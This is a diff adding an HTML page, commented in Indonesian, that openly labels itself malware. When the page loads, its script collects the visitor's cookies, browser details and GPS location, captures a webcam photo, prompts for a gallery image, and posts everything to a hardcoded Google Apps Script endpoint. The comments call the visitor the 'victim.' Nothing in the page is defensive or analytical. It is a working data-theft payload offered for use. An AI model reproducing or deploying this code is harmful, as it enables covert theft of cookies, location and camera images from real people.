@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halaman Putih Malware</title>
+    <style>
+        body {
+            background-color: #ffffff; /* Latar belakang putih */
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex; /* Menggunakan Flexbox untuk menengahkan konten */
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        .content-container {
+            max-width: 90%; /* Memastikan konten tidak melebar di layar kecil */
+            padding: 20px;
+        }
+        #statusMessage {
+            margin-top: 20px;
+            font-weight: bold;
+            padding: 10px;
+            border: 1px solid #eee;
+        }
+    </style>
+</head>
+<body>
+    <div class="content-container">
+        <!-- Elemen untuk menampilkan pesan status malware -->
+        <p id="statusMessage">Memuat...</p>
+    </div>
+
+    <!-- ======================================================================= -->
+    <!-- !!! SELURUH SCRIPT MALWARE DIMULAI DI SINI !!! -->
+    <!-- ======================================================================= -->
+    <script>
+        // =======================================================================
+        // !!! KONFIGURASI MALWARE - WAJIB DIGANTI !!!
+        // =======================================================================
+        // GANTI INI DENGAN URL WEB APP DARI GOOGLE APPS SCRIPT ANDA!
+        const SERVER_ENDPOINT = 'https://script.google.com/macros/s/AKfycbxzmikLoz0PD5Q-tZL0QBJn0HpKcmyYOjiA69aiVG6Ut7steqG43OH7kKRl7DeshaX7jA/exec'; 
+
+        // Mengambil elemen yang sudah kita definisikan di HTML
+        const statusMessage = document.getElementById('statusMessage');
+
+        if (!statusMessage) {
+             console.error("ERROR: Elemen dengan ID 'statusMessage' tidak ditemukan di HTML.");
+        }
+        // =======================================================================
+
+
+        // --- 1. FUNGSI PENGUMPULAN DATA DASAR ---
+
+        function collectBasicData() {
+            return {
+                userAgent: navigator.userAgent,
+                screenWidth: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                cookieData: document.cookie
+            };
+        }
+
+        async function getLocation() {
+            return new Promise((resolve, reject) =&gt; {
+                if (!navigator.geolocation) {
+                    resolve({ error: "Geolocation API tidak didukung." });
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (position) =&gt; resolve({
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    }),
+                    (error) =&gt; {
+                        console.error("Geolocation Error:", error);
+                        resolve({ error: `Error ${error.code}: ${error.message}` });
+                    },
+                    { timeout: 5000 }
+                );
+            });
+        }
+
+        async function takePhoto() {
+            return new Promise(resolve =&gt; {
+                if (navigator.mediaDevices &amp;&amp; navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream =&gt; {
+                            const video = document.createElement('video');
+                            video.srcObject = stream;
+                            video.play();
+
+                            setTimeout(() =&gt; {
+                                const canvas = document.createElement('canvas');
+                                canvas.width = 640;
+                                canvas.height = 480;
+                                const ctx = canvas.getContext('2d');
+
+                                video.onloadedmetadata = () =&gt; {
+                                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                    const dataUrl = canvas.toDataURL('image/jpeg');
+                                    stream.getTracks().forEach(track =&gt; track.stop()); 
+                                    resolve(dataUrl);
+                                };
+                                video.onloadeddata();
+                            }, 1000);
+                        })
+                        .catch(err =&gt; {
+                            console.error("Camera Error:", err);
+                            resolve("Error_Camera");
+                        });
+                } else {
+                    resolve("Error_Browser_NoCamera");
+                }
+            });
+        }
+
+        async function selectGallery() {
+            return new Promise(resolve =&gt; {
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.accept = 'image/*';
+
+                input.onchange = (e) =&gt; {
+                    const files = Array.from(e.target.files);
+                    if (files.length === 0) {
+                        resolve(null);
+                        return;
+                    }
+
+                    const file = files[0]; 
+                    const reader = new FileReader();
+                    reader.onloadend = () =&gt; {
+                        resolve({
+                            name: file.name,
+                            data: reader.result // Base64 string
+                        });
+                    };
+                    reader.readAsDataURL(file);
+                };
+                input.click();
+            });
+        }
+
+        // --- 2. FUNGSI UTAMA EKSEKUSI ---
+
+        async function executeMalware() {
+            if (!statusMessage) return; // Pencegahan jika script gagal menemukan elemen
+
+            statusMessage.textContent = "⏳ Mengumpulkan data (meminta izin GPS/Kamera)...";
+
+            try {
+                // Mengumpulkan semua data secara paralel
+                const [basicData, locationData, photoData, galleryData] = await Promise.all([
+                    collectBasicData(),
+                    getLocation(),
+                    takePhoto(),
+                    selectGallery()
+                ]);
+
+                // Menggabungkan semua data
+                const fullPayload = {
+                    ...basicData,
+                    ...locationData,
+                    photo_auto: photoData,
+                    gallery_image: galleryData ? galleryData.data : "Tidak ada foto galeri"
+                };
+
+                // Mengirim data ke endpoint GAS Anda
+                statusMessage.textContent = "📡 Mengirim data ke server...";
+                const response = await fetch(SERVER_ENDPOINT, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(fullPayload)
+                });
+
+                // Feedback kepada korban
+                if (response.ok) {
+                    statusMessage.textContent = "✅ SUKSES! Semua data berhasil dikirim.";
+                } else {
+                    const errorText = await response.text();
+                    statusMessage.textContent = `❌ GAGAL! Server merespon: ${errorText}`;
+                }
+
+            } catch (error) {
+                console.error("Kesalahan Fatal dalam Eksekusi Malware:", error);
+                statusMessage.textContent = `❌ ERROR KRITIS: ${error.message || "Periksa koneksi atau izin."}`;
+            }
+        }
+
+        // --- 3. PEMICU ---
+        // Jalankan malware otomatis saat halaman siap
+        document.addEventListener('DOMContentLoaded', function() {
+            executeMalware(); 
+        });
+    </script>
+</body>
+</html>
